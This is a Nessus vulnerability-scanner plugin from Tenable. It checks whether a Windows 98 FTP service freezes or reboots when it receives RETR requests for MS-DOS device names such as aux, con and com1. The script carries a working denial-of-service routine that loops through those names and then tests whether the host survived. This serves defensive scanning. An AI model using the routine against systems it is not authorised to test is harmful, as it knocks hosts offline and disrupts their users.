#
# (C) Tenable Network Security, Inc.
#

# Script audit and contributions from Carmichael Security 
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added links to the Bugtraq message archive and Microsoft Knowledgebase
#
# This script is a copy of http_w98_devname_dos.nasl. 
#


include("compat.inc");

if(description)
{
 script_id(10929);
 script_version("$Revision: 1.30 $");

 script_name(english:"Windows 98 FTP MS/DOS Device Name Request DoS");
 script_summary(english:"Crashes Windows 98");

 script_set_attribute(attribute:"synopsis", value:
"The remote Windows host is affected by a denial of service
vulnerability." );
 script_set_attribute(attribute:"description", value:
"It was possible to freeze or reboot Windows by reading a MS/DOS device
through FTP, using a file name like CON\CON, AUX.htm, or AUX.

An attacker may use this flaw to continuously crash the affected host,
preventing users from working properly." );
 # http://web.archive.org/web/20030607040140/http://support.microsoft.com/default.aspx?scid=kb;EN-US;Q256015
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?ee2e4e40" );
 script_set_attribute(attribute:"solution", value:
"Apply the patch from the above reference." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:C");

 script_set_attribute(attribute:"plugin_publication_date", value: "2002/03/29");
 script_cvs_date("$Date: 2013/05/31 21:45:42 $");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_KILL_HOST);
 script_copyright("This script is Copyright (C) 2001-2013 Tenable Network Security, Inc.");
 script_family(english:"FTP");
 script_dependencies("ftpserver_detect_type_nd_version.nasl", "ftp_anonymous.nasl", "smb_win_9x.nasl");
 script_require_ports("Services/ftp", 21);
 script_require_keys("Host/Win9x", "ftp/login");
 exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("ftp_func.inc");


if (! get_kb_item("Host/Win9x"))
 exit(0, "The remote OS is unknown or is not Windows 9x");

# The script code starts here

login = get_kb_item_or_exit("ftp/login");
pass  = get_kb_item("ftp/password");

# login = "ftp";
# pass = "test@test.com";

start_denial();

dev[0] = "aux";
dev[1] = "con";
dev[2] = "prn";
dev[3] = "clock$";
dev[4] = "com1";
dev[5] = "com2";
dev[6] = "lpt1";
dev[7] = "lpt2";

ext[0] = ".foo";
ext[1] = ".";
ext[2] = ". . .. ... .. .";
ext[3] = "-";

port = get_ftp_port(default: 21);

soc = open_sock_tcp(port);
if (! soc) exit(1, "Connection refused on port "+port+".");
r = ftp_recv_line(socket: soc);
ftp_close(socket: soc);
if (! r)
{
  exit(1, "Could not read FTP banner on port "+port+".");
}

 for (i = 0; dev[i]; i = i + 1)
 {
  d = dev[i];
  for (j = 0; ext[j]; j = j + 1)
  {
   e = ext[j];
   if (e == "-")
    name = string(d, "/", d);
   else
    name = string(d, e);
   soc = open_sock_tcp(port);
   if(soc)
   {
    if (ftp_authenticate(socket:soc, user:login, pass:pass))
    {
     port2 = ftp_pasv(socket:soc);
     soc2 = open_sock_tcp(port2, transport:get_port_transport(port));
     req = 'RETR '+ name+'\r\n';
     send(socket:soc, data:req);
     if (soc2) close(soc2);
    }
    close(soc);
   }
  }
 }


# Check if FTP server is still alive
r = NULL;
soc = open_sock_tcp(port);
if (soc)
{
  r = ftp_recv_line(socket: soc);
  ftp_close(socket: soc);
}

if (r) exit(0, "The FTP server on port "+port+" is still alive.");

alive = end_denial();					     
if(!alive)
{
 security_hole(port);
 set_kb_item(name:"Host/dead", value:TRUE);
 exit(0);
}
else
  exit(0, "The remote host is still alive.");
